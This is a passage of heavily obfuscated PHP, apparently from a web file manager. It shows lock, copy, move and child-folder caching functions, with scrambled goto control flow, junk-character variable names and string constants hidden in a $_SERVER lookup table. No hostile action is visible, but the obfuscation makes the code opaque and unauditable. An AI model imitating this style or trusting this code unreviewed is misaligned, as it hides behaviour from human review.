$FßÛ±®ÀÓπ) { goto D±Â—Ëèøô; D±Â—Ëèøô: $Eóí„ºÑŒâ =& $_SERVER[Æ¡î¢≠¯™]; $bö¯’à°œ∑ = $this->sourceInfo($FßÛ±®ÀÓπ); $BÇÆ·õ≈ãÔ = $c∞™…»ÕŸØ . $Eóí„ºÑŒâ[103] . $FßÛ±®ÀÓπ; goto BÒìπŸ∂·Ω; e∏àá¨å÷Ë: $dóÃáÛçÒΩ = array_reverse($this->parentLevelArray($bö¯’à°œ∑[$Eóí„ºÑŒâ[463]])); foreach ($dóÃáÛçÒΩ as $eñ®†„Öù) { $BÇÆ·õ≈ãÔ = $c∞™…»ÕŸØ . $Eóí„ºÑŒâ[503] . $eñ®†„Öù; if (CacheLock::lockGet($Eóí„ºÑŒâ[504] . $BÇÆ·õ≈ãÔ)) { $bö¯’à°œ∑ = $this->sourceInfo($eñ®†„Öù); CacheLock::setErrorMsg($Eóí„ºÑŒâ[164] . htmlspecialchars($bö¯’à°œ∑[$Eóí„ºÑŒâ[28]]) . $Eóí„ºÑŒâ[480] . $eƒ“¡™Íç); $this->_lockKey($BÇÆ·õ≈ãÔ, 1); $this->_lockKey($BÇÆ·õ≈ãÔ, 0); } } goto däóòñÇ≠ˆ; e„≠Ω„„Ω“: CacheLock::setErrorMsg($Eóí„ºÑŒâ[164] . htmlspecialchars($bö¯’à°œ∑[$Eóí„ºÑŒâ[28]]) . $Eóí„ºÑŒâ[480] . $eƒ“¡™Íç); $this->_lockKey($BÇÆ·õ≈ãÔ, 1); $this->_lockKey($BÇÆ·õ≈ãÔ, 0); goto e∏àá¨å÷Ë; BÒìπŸ∂·Ω: $this->_lockTimeStart[$BÇÆ·õ≈ãÔ] = timeFloat(); if (!is_array($bö¯’à°œ∑)) { return; } $eƒ“¡™Íç = LNG($Eóí„ºÑŒâ[502]); goto e„≠Ω„„Ω“; däóòñÇ≠ˆ: } private function _lockCheckEnd($Aª—ë˜∂∆Õ, $DÕµ”æÛøË) { goto C„Öäá‹¥¶; eè⁄≥âÍÚ≈: if ($D‡¯£»Ãç± > 0.5) { unset(self::$cacheSourceInfo[$E“¶ºà◊”—[414] . $DÕµ”æÛøË]); } $DÇªã«œ®– = $this->sourceInfo($DÕµ”æÛøË); if (!$DÇªã«œ®–) { show_json(LNG($E“¶ºà◊”—[112]), !1); } goto E≠√∂àÁ¬ú; eºÁ•‹≠“≠: if (!isset($this->_lockTimeStart[$FßıÉÂ›Ãñ])) { return; } $D‡¯£»Ãç± = timeFloat() - $this->_lockTimeStart[$FßıÉÂ›Ãñ]; unset($this->_lockTimeStart[$FßıÉÂ›Ãñ]); goto eè⁄≥âÍÚ≈; C„Öäá‹¥¶: $E“¶ºà◊”— =& $_SERVER[Æ¡î¢≠¯™]; $FßıÉÂ›Ãñ = $Aª—ë˜∂∆Õ . $E“¶ºà◊”—[103] . $DÕµ”æÛøË; CacheLock::setErrorMsg($E“¶ºà◊”—[66]); goto eºÁ•‹≠“≠; E≠√∂àÁ¬ú: } private function _lockParent($d“£∏Ø√Œ”, $c£»≠‘µÓÎ, $EÌòûôÓú) { if (!$this->autoLockSet) { return; } $F∂ﬁ“—‰ÕÁ = $this->sourceInfo($d“£∏Ø√Œ”); if (!is_array($F∂ﬁ“—‰ÕÁ)) { return; } $fò·‰ªè»∂ = array_reverse($this->parentLevelArray($F∂ﬁ“—‰ÕÁ[$_SERVER[Æ¡î¢≠¯™][463]])); foreach ($fò·‰ªè»∂ as $Eâ◊Î•Øéﬂ) { $this->_lockEvent($Eâ◊Î•Øéﬂ, $c£»≠‘µÓÎ, $EÌòûôÓú); } } private function _lockEvent($AŸéÑè∏∂Ó, $c»ãíé”ﬂ¡, $e§Ò™ÉËäÉ) { $E™óı◊ÙË» =& $_SERVER[Æ¡î¢≠¯™]; if (!$this->autoLockSet) { return; } foreach ($c»ãíé”ﬂ¡ as $Dç©á˘ıüÕ) { $büÉûºÆªÂ = $Dç©á˘ıüÕ . $E™óı◊ÙË»[103] . $AŸéÑè∏∂Ó; if ($e§Ò™ÉËäÉ && CacheLock::lockGet($E™óı◊ÙË»[504] . $büÉûºÆªÂ)) { continue; } $this->_lockKey($büÉûºÆªÂ, $e§Ò™ÉËäÉ); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($DÀéµÜÓäª, $DÆä¥Œ»√µ = 1) { $B„°€‰‚‘Ô = $_SERVER[Æ¡î¢≠¯™][504] . md5($DÀéµÜÓäª); if ($DÆä¥Œ»√µ) { if (isset(self::$_lockItemArr[$B„°€‰‚‘Ô])) { return; } self::$_lockItemArr[$B„°€‰‚‘Ô] = 1; CacheLock::lock($B„°€‰‚‘Ô, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$B„°€‰‚‘Ô])) { return; } unset(self::$_lockItemArr[$B„°€‰‚‘Ô]); CacheLock::unlock($B„°€‰‚‘Ô); } } public function isParentOf($Aíˆáâ∑Ö, $b¶÷áó™„Á) { goto e…’´íÆﬁ; e…’´íÆﬁ: $Cñ°úâ≠áÙ =& $_SERVER[Æ¡î¢≠¯™]; $d∫ˆ∑“‹∞â = $this->sourceInfo($Aíˆáâ∑Ö); $açÚò∑å◊Í = $this->sourceInfo($b¶÷áó™„Á); goto eÖƒÂÎˆãÖ; e±íÿ†˜”Ó: return $dÓ§‘ïÜÛû; goto aˆÚ≤Ñ’Ïù; eÖƒÂÎˆãÖ: $C®ŒÜ•äôî = $d∫ˆ∑“‹∞â[$Cñ°úâ≠áÙ[463]] . $d∫ˆ∑“‹∞â[$Cñ°úâ≠áÙ[374]] . $Cñ°úâ≠áÙ[47]; $CÃÏÂéËûÊ = $açÚò∑å◊Í[$Cñ°úâ≠áÙ[463]] . $açÚò∑å◊Í[$Cñ°úâ≠áÙ[374]] . $Cñ°úâ≠áÙ[47]; $dÓ§‘ïÜÛû = strpos($CÃÏÂéËûÊ, $C®ŒÜ•äôî) === 0; goto e±íÿ†˜”Ó; aˆÚ≤Ñ’Ïù: } private $targetIsDelete = 0; public function copy($B‡Ω†∆Ã±Ç, $fÓÃÍ≈Éºû, $B“Ωê∑˜âä = REPEAT_REPLACE, $dÎîù¢ï”ê = '') { goto Aó™éÿ∏ãÎ; Déüîﬁ™é‹: $this->_childrenListClear(); $this->lockCopyEnd($B‡Ω†∆Ã±Ç); $this->lockWriteEnd($fÓÃÍ≈Éºû, $dÉÆæ¨Úû√); goto c¿–§ıöÑ¥; c¿–§ıöÑ¥: if ($b≠ôç©˜¡ë[$CÙıÈçÒ€√[375]] == $CÙıÈçÒ€√[93] && $c–—˘¨˜ ï == $E—ä©Üø…û) { $this->folderSizeResetChildren($c–—˘¨˜ ï); } Model($CÙıÈçÒ€√[508])->addAll($Bñ¯‘∑Œ”¶[$CÙıÈçÒ€√[506]], array(), !0); if ($c–—˘¨˜ ï != $E—ä©Üø…û || $b≠ôç©˜¡ë[$CÙıÈçÒ€√[375]] == $CÙıÈçÒ€√[93]) { Model($CÙıÈçÒ€√[509])->eventCopy($E—ä©Üø…û); } goto C§∫ëü¥∑õ; C§∫ëü¥∑õ: $this->saveAll($Bñ¯‘∑Œ”¶[$CÙıÈçÒ€√[507]]); Model($CÙıÈçÒ€√[174])->linkAdd($Bñ¯‘∑Œ”¶[$CÙıÈçÒ€√[505]]); $this->folderSizeReset($fÓÃÍ≈Éºû); goto aìë‹¬¡Êﬂ; b…ôèÉåä«: if (!$b≠ôç©˜¡ë || !$AÒö†ˆß–Ï || $AÒö†ˆß–Ï[$CÙıÈçÒ€√[375]] != $CÙıÈçÒ€√[93]) { return !1; } if ($this->isParentOf($B‡Ω†∆Ã±Ç, $fÓÃÍ≈Éºû)) { return !1; } $dÉÆæ¨Úû√ = $dÎîù¢ï”ê ? $dÎîù¢ï”ê : $b≠ôç©˜¡ë[$CÙıÈçÒ€√[28]]; goto c™¯πÚø‚⁄; aìë‹¬¡Êﬂ: $this->updateModifyTime($fÓÃÍ≈Éºû); return $E—ä©Üø…û; goto e‹–«…†Òã; CÀÀ∑Ã Û≤: $this->targetIsDelete = intval($b≠ôç©˜¡ë[$CÙıÈçÒ€√[401]]); $c–—˘¨˜ ï = $this->fileNameExistCache($fÓÃÍ≈Éºû, $b≠ôç©˜¡ë[$CÙıÈçÒ€√[28]]); $E—ä©Üø…û = $this->_copy($B‡Ω†∆Ã±Ç, $fÓÃÍ≈Éºû, $B“Ωê∑˜âä, $Bñ¯‘∑Œ”¶, !0, $dÎîù¢ï”ê); goto Déüîﬁ™é‹; c™¯πÚø‚⁄: $this->lockCopyStart($B‡Ω†∆Ã±Ç); $this->lockWriteStart($fÓÃÍ≈Éºû, $dÉÆæ¨Úû√); $Bñ¯‘∑Œ”¶ = array($CÙıÈçÒ€√[505] => array(), $CÙıÈçÒ€√[506] => array(), $CÙıÈçÒ€√[507] => array()); goto CÀÀ∑Ã Û≤; Aó™éÿ∏ãÎ: $CÙıÈçÒ€√ =& $_SERVER[Æ¡î¢≠¯™]; $b≠ôç©˜¡ë = $this->sourceInfo($B‡Ω†∆Ã±Ç); $AÒö†ˆß–Ï = $this->sourceInfo($fÓÃÍ≈Éºû); goto b…ôèÉåä«; e‹–«…†Òã: } private function _copy($EïÏ—Öîºí, $Eä°∆¿ªı≤, $b§à…›∑∆Æ, &$aÈ°‰Æı£è, $aÊõßÔù»ö, $cì¬µÁ˜Ï¡ = '') { goto f…Âò÷îˆç; cÜ…äÆπê√: if (!$Eç€…ò∞∏‡) { return $this->_copyCreate($EïÏ—Öîºí, $Eä°∆¿ªı≤, $eßê”êºœ‰, $aÈ°‰Æı£è); } $Bç«ãõì‹¡ = $Eç€…ò∞∏‡; if ($bâ·÷ˆ›–™) { if ($b§à…›∑∆Æ == REPEAT_RENAME_FOLDER) { $eßê”êºœ‰ = $this->fileNameAutoCache($Eä°∆¿ªı≤, $eßê”êºœ‰, $b§à…›∑∆Æ, $bâ·÷ˆ›–™); $Bç«ãõì‹¡ = $this->_copyCreate($EïÏ—Öîºí, $Eä°∆¿ªı≤, $eßê”êºœ‰, $aÈ°‰Æı£è); } else { $CÓÖúäÇ§Ü = $this->_childrenList($EïÏ—Öîºí); foreach ($CÓÖúäÇ§Ü as $fîâ¯£Íâª) { $this->_copy($fîâ¯£Íâª[$e’çèƒàêñ[374]], $Eç€…ò∞∏‡, $b§à…›∑∆Æ, $aÈ°‰Æı£è, !1); } } } else { if ($b§à…›∑∆Æ == REPEAT_RENAME || $b§à…›∑∆Æ == REPEAT_RENAME_FOLDER) { $eßê”êºœ‰ = $this->fileNameAutoCache($Eä°∆¿ªı≤, $eßê”êºœ‰, $b§à…›∑∆Æ, $bâ·÷ˆ›–™); $Bç«ãõì‹¡ = $this->_copyCreate($EïÏ—Öîºí, $Eä°∆¿ªı≤, $eßê”êºœ‰, $aÈ°‰Æı£è); } else { if ($b§à…›∑∆Æ == REPEAT_REPLACE) { $C¬ˆØÖ‘©≈ = $this->sourceInfoCache($Eç€…ò∞∏‡); $FÏù∞ö‡Àñ = $this->fileHistory($C¬ˆØÖ‘©≈, $d‚òÏÊ§ä›[$e’çèƒàêñ[423]], $d‚òÏÊ§ä›[$e’çèƒàêñ[87]]); if ($FÏù∞ö‡Àñ) { $aÈ°‰Æı£è[$e’çèƒàêñ[505]][] = $d‚òÏÊ§ä›[$e’çèƒàêñ[423]]; } } else { if ($b§à…›∑∆Æ == REPEAT_SKIP) { } } } Hook::trigger($e’çèƒàêñ[510], array($e’çèƒàêñ[511], $d‚òÏÊ§ä›, 0)); } goto E˘ƒ∫´»â€; BâäÆ∞ÿ·ñ: $eßê”êºœ‰ = $cì¬µÁ˜Ï¡ ? $cì¬µÁ˜Ï¡ : $d‚òÏÊ§ä›[$e’çèƒàêñ[28]]; $Eç€…ò∞∏‡ = $this->fileNameExistCache($Eä°∆¿ªı≤, $eßê”êºœ‰); if ($aÊõßÔù»ö) { $this->_childrenAllMake($EïÏ—Öîºí); if ($bâ·÷ˆ›–™ && $Eç€…ò∞∏‡) { $this->_childrenAllMake($Eç€…ò∞∏‡); } } goto cÜ…äÆπê√; E˘ƒ∫´»â€: return $Bç«ãõì‹¡; goto D¬ê ñÚôÕ; f…Âò÷îˆç: $e’çèƒàêñ =& $_SERVER[Æ¡î¢≠¯™]; $d‚òÏÊ§ä› = $this->sourceInfoCache($EïÏ—Öîºí); $bâ·÷ˆ›–™ = $d‚òÏÊ§ä›[$e’çèƒàêñ[375]] == $e’çèƒàêñ[93]; goto BâäÆ∞ÿ·ñ; D¬ê ñÚôÕ: } private function _copyCreate($F¢ã‚ˆåü◊, $CÈ•øä ë≥, $E–¨¬§ƒ∞, &$e”¯‹◊™›÷) { goto c∂¨µ≠ΩéÛ; f”ìØû–çû: $CÔ„ÌäÀ·–[$F¢ã‚ˆåü◊] = $b√Ö™´∆ﬁà; $F≈ª‡∆ó°ó = array(); $A∞óá™ß‡É = array(); goto C⁄à” ÀÇå; Céõ∑¯ûÊÂ: $AˆâÛêÀÇ© = $this->sourceInfo($b√Ö™´∆ﬁà); foreach ($Fƒ…ÊÉıÔ® as $fΩ´Èé·ƒ∫) { $câÊË€÷‰í = $this->_makeItemData($fΩ´Èé·ƒ∫, $AˆâÛêÀÇ©, $fΩ´Èé·ƒ∫[$c¬≈‘¬⁄Õë[28]]); $câÊË€÷‰í[$c¬≈‘¬⁄Õë[463]] = $fΩ´Èé·ƒ∫[$c¬≈‘¬⁄Õë[463]]; $e§ﬂƒ√ÍÇ≥[] = $câÊË€÷‰í; } $this->chunkEventSet($c¬≈‘¬⁄Õë[515], array($c¬≈‘¬⁄Õë[516], $F“ÁáÊµ„â, $cä „—áÚ¨)); goto aÉ∑ÕÒ“Ù∂; cê¿¥ÃÏ°â: $F“ÁáÊµ„â = $this->_makeItemData($EºêÙóºáÒ, $CÿΩÔûâÜ‘, $E–¨¬§ƒ∞); Hook::trigger($c¬≈‘¬⁄Õë[512], $F“ÁáÊµ„â); Hook::trigger($c¬≈‘¬⁄Õë[513], array($c¬≈‘¬⁄Õë[514], $F“ÁáÊµ„â, 0)); goto AÌè∞áûõë; c∂¨µ≠ΩéÛ: $c¬≈‘¬⁄Õë =& $_SERVER[Æ¡î¢≠¯™]; $EºêÙóºáÒ = $this->sourceInfoCache($F¢ã‚ˆåü◊); $CÿΩÔûâÜ‘ = $this->sourceInfoCache($CÈ•øä ë≥); goto cê¿¥ÃÏ°â; c¯‚ç§É¿È: $this->_childrenListAll($F¢ã‚ˆåü◊, $Fƒ…ÊÉıÔ®); $cä „—áÚ¨ = count($Fƒ…ÊÉıÔ®); if ($cä „—áÚ¨ == 0) { return $b√Ö™´∆ﬁà; } goto Céõ∑¯ûÊÂ; däµÜøàÇª: if ($EºêÙóºáÒ[$c¬≈‘¬⁄Õë[375]] != $c¬≈‘¬⁄Õë[93]) { $e”¯‹◊™›÷[$c¬≈‘¬⁄Õë[505]][] = $EºêÙóºáÒ[$c¬≈‘¬⁄Õë[423]]; return $b√Ö™´∆ﬁà; } $Fƒ…ÊÉıÔ® = array(); $e§ﬂƒ√ÍÇ≥ = array(); goto c¯‚ç§É¿È; cı◊´Ç≤æ©: $this->chunkEventSet($c¬≈‘¬⁄Õë[519], array($c¬≈‘¬⁄Õë[520], $F“ÁáÊµ„â, $cä „—áÚ¨)); $this->saveAll($A∞óá™ß‡É); return $b√Ö™´∆ﬁà; goto aÔ —çÚéê; AÌè∞áûõë: $b√Ö™´∆ﬁà = $this->add($F“ÁáÊµ„â); $aŸÙ±ù¢ˆ¢ = array($c¬≈‘¬⁄Õë[374] => $b√Ö™´∆ﬁà, $c¬≈‘¬⁄Õë[28] => $E–¨¬§ƒ∞); $this->_copyApplyMeta($aŸÙ±ù¢ˆ¢, $e”¯‹◊™›÷); goto däµÜøàÇª; C⁄à” ÀÇå: foreach ($eœœ‘¡›÷À as $fΩ´Èé·ƒ∫) { $B›ôØı”Ìñ = $fΩ´Èé·ƒ∫[$c¬≈‘¬⁄Õë[374]]; $bØ‚∞®«èÖ = $this->_childrenMatch($CÔ„ÌäÀ·–, $fΩ´Èé·ƒ∫, $AˆâÛêÀÇ©); $F≈ª‡∆ó°ó[] = array($c¬≈‘¬⁄Õë[374], $B›ôØı”Ìñ, $c¬≈‘¬⁄Õë[465], $bØ‚∞®«èÖ[$c¬≈‘¬⁄Õë[465]]); $A∞óá™ß‡É[] = array($c¬≈‘¬⁄Õë[374], $B›ôØı”Ìñ, $c¬≈‘¬⁄Õë[463], $bØ‚∞®«èÖ[$c¬≈‘¬⁄Õë[463]]); $this->_copyApplyMeta($fΩ´Èé·ƒ∫, $e”¯‹◊™›÷); if ($fΩ´Èé·ƒ∫[$c¬≈‘¬⁄Õë[375]] != $c¬≈‘¬⁄Õë[93]) { $e”¯‹◊™›÷[$c¬≈‘¬⁄Õë[505]][] = $fΩ´Èé·ƒ∫[$c¬≈‘¬⁄Õë[423]]; } } $this->chunkEventSet($c¬≈‘¬⁄Õë[517], array($c¬≈‘¬⁄Õë[518], $F“ÁáÊµ„â, $cä „—áÚ¨)); $this->saveAll($F≈ª‡∆ó°ó); goto cı◊´Ç≤æ©; aÉ∑ÕÒ“Ù∂: $this->addAll($e§ﬂƒ√ÍÇ≥, array(), !1); $eœœ‘¡›÷À = $this->where(array($c¬≈‘¬⁄Õë[465] => $b√Ö™´∆ﬁà))->select(); $CÔ„ÌäÀ·– = $this->_childrenMakeRelation($Fƒ…ÊÉıÔ®, $eœœ‘¡›÷À); goto f”ìØû–çû; aÔ —çÚéê: } private function _childrenMakeRelation($BÁúıˆ∞Æ£, $AÃÊÊ≥ãÙ¨) { $bŒçØîæﬁÈ =& $_SERVER[Æ¡î¢≠¯™]; $cÏß∂æà‚À = array(); $f©˘áŸö∫™ = array(); foreach ($BÁúıˆ∞Æ£ as $dπèÜÇó≠«) { $D™ë˘öÂ∫ú = $dπèÜÇó≠«[$bŒçØîæﬁÈ[28]] . $bŒçØîæﬁÈ[8] . $dπèÜÇó≠«[$bŒçØîæﬁÈ[463]]; $cÏß∂æà‚À[$D™ë˘öÂ∫ú] = $dπèÜÇó≠«[$bŒçØîæﬁÈ[374]]; } foreach ($AÃÊÊ≥ãÙ¨ as $dπèÜÇó≠«) { $D™ë˘öÂ∫ú = $dπèÜÇó≠«[$bŒçØîæﬁÈ[28]] . $bŒçØîæﬁÈ[8] . $dπèÜÇó≠«[$bŒçØîæﬁÈ[463]]; $f´Œ≥ªúÛà = $cÏß∂æà‚À[$D™ë˘öÂ∫ú]; $f©˘áŸö∫™[$f´Œ≥ªúÛà] = $dπèÜÇó≠«[$bŒçØîæﬁÈ[374]]; } return $f©˘áŸö∫™; } private function _childrenMatch($E√µ‹ÙÙø…, $dîÆîê‚Ü÷, $e≈ÏàßèÓí) { goto AÖ±˘∆ÃÖÖ; D’ä´√µôù: foreach ($eë◊Ö∏îáã as $D∂„ì±ôœå) { if (isset($E√µ‹ÙÙø…[$D∂„ì±ôœå])) { $cƒ©„¯ì¡∑ .= $E√µ‹ÙÙø…[$D∂„ì±ôœå] . $a≈„©òÑ’…[521]; } } $cƒ©„¯ì¡∑ = rtrim($cƒ©„¯ì¡∑, $a≈„©òÑ’…[47]) . $a≈„©òÑ’…[47]; $a∫É≈”’ØÛ = $this->parentLevelArray($cƒ©„¯ì¡∑); goto bùÊ∞õ·ìä; AÖ±˘∆ÃÖÖ: $a≈„©òÑ’… =& $_SERVER[Æ¡î¢≠¯™]; $cƒ©„¯ì¡∑ = $e≈ÏàßèÓí[$a≈„©òÑ’…[463]]; $eë◊Ö∏îáã = $this->parentLevelArray($dîÆîê‚Ü÷[$a≈„©òÑ’…[463]]); goto D’ä´√µôù; bùÊ∞õ·ìä: $bºÛ∏ç€æì = $a∫É≈”’ØÛ[count($a∫É≈”’ØÛ) - 1]; return array($a≈„©òÑ’…[465] => $bºÛ∏ç€æì, $a≈„©òÑ’…[463] => $cƒ©„¯ì¡∑); goto f£œÿ∂êÉú; f£œÿ∂êÉú: } private function _makeItemData($Eâ†§≠∑Îÿ, $BìßŒ∑∫∑Ï, $AπÑ‹Ôﬁâ¿) { $fœ≈õÁπ—á =& $_SERVER[Æ¡î¢≠¯™]; $AÂò œ◊î¥ = array($fœ≈õÁπ—á[522] => $Eâ†§≠∑Îÿ[$fœ≈õÁπ—á[375]], $fœ≈õÁπ—á[391] => $AπÑ‹Ôﬁâ¿, $fœ≈õÁπ—á[523] => $Eâ†§≠∑Îÿ[$fœ≈õÁπ—á[377]], $fœ≈õÁπ—á[424] => $Eâ†§≠∑Îÿ[$fœ≈õÁπ—á[423]], $fœ≈õÁπ—á[524] => $Eâ†§≠∑Îÿ[$fœ≈õÁπ—á[87]], $fœ≈õÁπ—á[525] => $BìßŒ∑∫∑Ï[$fœ≈õÁπ—á[376]], $fœ≈õÁπ—á[526] => $BìßŒ∑∫∑Ï[$fœ≈õÁπ—á[460]], $fœ≈õÁπ—á[527] => USER_ID, $fœ≈õÁπ—á[528] => USER_ID, $fœ≈õÁπ—á[373] => $BìßŒ∑∫∑Ï[$fœ≈õÁπ—á[374]], $fœ≈õÁπ—á[529] => $BìßŒ∑∫∑Ï[$fœ≈õÁπ—á[463]] . $BìßŒ∑∫∑Ï[$fœ≈õÁπ—á[374]] . $fœ≈õÁπ—á[47], $fœ≈õÁπ—á[400] => 0, $fœ≈õÁπ—á[530] => $fœ≈õÁπ—á[33]); return $AÂò œ◊î¥; } private function _copyApplyMeta($b‡¯Òƒﬂ’®, &$e˘•ÏñÉ‘¬) { $D‹∫à»äú =& $_SERVER[Æ¡î¢≠¯™]; $dâñ°Ñêﬂñ = $b‡¯Òƒﬂ’®[$D‹∫à»äú[374]]; $BÑÔæÛ ê≤ = $b‡¯Òƒﬂ’®[$D‹∫à»äú[28]]; if (!isset($b‡¯Òƒﬂ’®[$D‹∫à»äú[531]]) || !$b‡¯Òƒﬂ’®[$D‹∫à»äú[531]] || $b‡¯Òƒﬂ’®[$D‹∫à»äú[531]] == $D‹∫à»äú[472]) { $e˘•ÏñÉ‘¬[$D‹∫à»äú[507]][] = array($D‹∫à»äú[374], $dâñ°Ñêﬂñ, $D‹∫à»äú[531], short_id($dâñ°Ñêﬂñ)); } if (Input::check($BÑÔæÛ ê≤, $D‹∫à»äú[532])) { $e˘•ÏñÉ‘¬[$D‹∫à»äú[506]][] = array($D‹∫à»äú[374] => $dâñ°Ñêﬂñ, $D‹∫à»äú[99] => $D‹∫à»äú[420], $D‹∫à»äú[365] => str_replace($D‹∫à»äú[50], $D‹∫à»äú[33], Pinyin::encode($BÑÔæÛ ê≤))); $e˘•ÏñÉ‘¬[$D‹∫à»äú[506]][] = array($D‹∫à»äú[374] => $dâñ°Ñêﬂñ, $D‹∫à»äú[99] => $D‹∫à»äú[419], $D‹∫à»äú[365] => Pinyin::encode($BÑÔæÛ ê≤, $D‹∫à»äú[533])); } } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($a„ÕÖ¡ÕÇÏ) { goto Dõ‰ØœΩˆç; FªÃ´©ãü˘: $e«ûÍ—›∑À = array_to_keyvalue($e«ûÍ—›∑À, $d”ô•‘¢Ï´[374]); foreach ($e«ûÍ—›∑À as $dã≈æÚ…¨ ) { $a‘†Êˆ⁄è¥ = $dã≈æÚ…¨ [$d”ô•‘¢Ï´[465]]; $a„ÕÖ¡ÕÇÏ = $dã≈æÚ…¨ [$d”ô•‘¢Ï´[374]]; if (!isset($this->_childrenListCache[$a„ÕÖ¡ÕÇÏ]) && $dã≈æÚ…¨ [$d”ô•‘¢Ï´[375]] == $d”ô•‘¢Ï´[93]) { $this->_childrenListCache[$a„ÕÖ¡ÕÇÏ] = array(); } if (!isset($this->_childrenListCache[$a‘†Êˆ⁄è¥])) { $this->_childrenListCache[$a‘†Êˆ⁄è¥] = array(); } $this->_childrenListCache[$a‘†Êˆ⁄è¥][$a„ÕÖ¡ÕÇÏ] = $dã≈æÚ…¨ ; $this->_childrenItemCache[$a„ÕÖ¡ÕÇÏ] = $dã≈æÚ…¨ ; } goto e€∆¨ä¥µı; e—ëâ‡óÑ•: $f˘Ô¥ã∞ëÎ = array($d”ô•‘¢Ï´[463] => array($d”ô•‘¢Ï´[487], $EÌ≈ÙÌ‘áè[$d”ô•‘¢Ï´[463]] . $a„ÕÖ¡ÕÇÏ . $d”ô•‘¢Ï´[488]), $d”ô•‘¢Ï´[401] => $this->targetIsDelete); $e«ûÍ—›∑À = $this->field($b±‡‘‚¢„ã)->where($f˘Ô¥ã∞ëÎ)->select(); if (!$e«ûÍ—›∑À) { return; } goto FªÃ´©ãü˘; Dõ‰ØœΩˆç: $d”ô•‘¢Ï´ =& $_SERVER[Æ¡î¢≠¯™]; $EÌ≈ÙÌ‘áè = $this->sourceInfo($a„ÕÖ¡ÕÇÏ); $b±‡‘‚¢„ã = $d”ô•‘¢Ï´[534]; goto e—ëâ‡óÑ•; e€∆¨ä¥µı: } private function _childrenListAll($F®≈Àì£êã, &$Bã˜„äÎß‡) { $bæ¶ÌŸ∫«Í =& $_SERVER[Æ¡î¢≠¯™]; if (!isset($this->_childrenListCache[$F®≈Àì£êã])) { return; } $f◊ã®¡É§É = $this->_childrenListCache[$F®≈Àì£êã]; foreach ($f◊ã®¡É§É as $f“èé°êáã => $aÃ≤ØàÜ§) { $Bã˜„äÎß‡[$f“èé°êáã] = $aÃ≤ØàÜ§; if ($aÃ≤ØàÜ§[$bæ¶ÌŸ∫«Í[375]] == $bæ¶ÌŸ∫«Í[93]) { $this->_childrenListAll($f“èé°êáã, $Bã˜„äÎß‡); } } } private function sourceInfoCache($d≤âãÑöáè) { if (isset($this->_childrenItemCache[$d≤âãÑöáè])) { return $this->_childrenItemCache[$d≤âãÑöáè]; } return $this->sourceInfo($d≤âãÑöáè); } private function _childrenList($CëÍßñˆ—¯) { if (isset($this->_childrenListCache[$CëÍßñˆ—¯])) { return $this->_childrenListCache[$CëÍßñˆ—¯]; } return $this->_childrenListSelect($CëÍßñˆ—¯); } private function _childrenListSelect($BâúóüüÃÏ) { goto däÙéèÃ“É; däÙéèÃ“É: $EÕ±œé•ìÌ =& $_SERVER[Æ¡î¢≠¯™]; $Dç≠‡∂á‰ó = array($EÕ±œé•ìÌ[465] => $BâúóüüÃÏ, $EÕ±œé•ìÌ[401] => $this->targetIsDelete); $Fûê¥ì›≠∑ = $this->where($Dç≠‡∂á‰ó)->select(); goto AÀ›êÑ€„”; Côë—ÖÎ±®: foreach ($a»È¿ÜÓıà as $BâúóüüÃÏ => $bµÔ¶áÖì◊) { $this->_childrenItemCache[$BâúóüüÃÏ] = $bµÔ¶áÖì◊; } return $a»È¿ÜÓıà; goto C∏¡ïîﬂ¢õ; AÀ›êÑ€„”: $Fûê¥ì›≠∑ = $Fûê¥ì›≠∑ ? $Fûê¥ì›≠∑ : array(); $a»È¿ÜÓıà = array_to_keyvalue($Fûê¥ì›≠∑, $EÕ±œé•ìÌ[374]); $this->_childrenListCache[$BâúóüüÃÏ] = $a»È¿ÜÓıà; goto Côë—ÖÎ±®; C∏¡ïîﬂ¢õ: } private function fileNameExistCache($bÂŒá÷∫µ≥, $Bú◊®ë∫Ü¢) { $eœÖ•¡”≥° =& $_SERVER[Æ¡î¢≠¯™]; $Bú◊®ë∫Ü¢ = strtolower($Bú◊®ë∫Ü¢); $b∞›êá·î· = $this->_childrenList($bÂŒá÷∫µ≥); foreach ($b∞›êá·î· as $a∞´√°¿√¬) { if ($Bú◊®ë∫Ü¢ == strtolower($a∞´√°¿√¬[$eœÖ•¡”≥°[28]])) { return $a∞´√°¿√¬[$eœÖ•¡”≥°[374]]; } } return !1; } private function fileNameAutoCache($c≈Ï°áë—∞, $e·«–ü—ñ∞, $fÊãÛ˜≈ä∫, $DÜ£ù√∫«∫) { $cÚâ—ÿü‘Í =& $_SERVER[Æ¡î¢≠¯™]; $C””ï⁄åïæ = $this->_childrenList($c≈Ï°áë—∞); $dî√™–êë  = array_to_keyvalue($C””ï⁄åïæ, $cÚâ—ÿü‘Í[33], $cÚâ—ÿü‘Í[28]); return $this->fileNameAutoGet($dî√™–êë , $e·«–ü—ñ∞, $fÊãÛ˜≈ä∫, $DÜ£ù√∫«∫); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($f∞˜Íâﬁ‰÷, $bö¨ΩöÔ©ß, $b“ÚË„ˆãƒ = REPEAT_REPLACE, $e£‚é’¬Ã∂ = '') { goto a«ÀÎçï¬≠; EÍ´¡‚—™Ó: $b––á”ùÉÙ = $this->_move($f∞˜Íâﬁ‰÷, $bö¨ΩöÔ©ß, $b“ÚË„ˆãƒ, $câÑ®ë·â©, $e£‚é’¬Ã∂); $this->sourceCacheClear(); if ($dã£ñ˘»î∑[$b≠úï§Ìî⁄[375]] == $b≠úï§Ìî⁄[93] && $cÃéäûçπô) { $this->folderSizeResetChildren($b––á”ùÉÙ); } goto C££œÜ¡Óú; BÏòñÚ÷®ˆ: $DØ”Øµ≤ÊÚ = array($dã£ñ˘»î∑[$b≠úï§Ìî⁄[465]], $bö¨ΩöÔ©ß); if ($dã£ñ˘»î∑[$b≠úï§Ìî⁄[375]] == $b≠úï§Ìî⁄[93]) { $DØ”Øµ≤ÊÚ[] = $f∞˜Íâﬁ‰÷; } $this->updateModifyTime($DØ”Øµ≤ÊÚ); goto d‘‚–ﬁÒÙî; a ‚ëµ’†¯: Hook::trigger($b≠úï§Ìî⁄[535], $A§àÁ˘‰¨Æ); $this->targetIsDelete = intval($dã£ñ˘»î∑[$b≠úï§Ìî⁄[401]]); if ($dã£ñ˘»î∑[$b≠úï§Ìî⁄[465]] == $bö¨ΩöÔ©ß 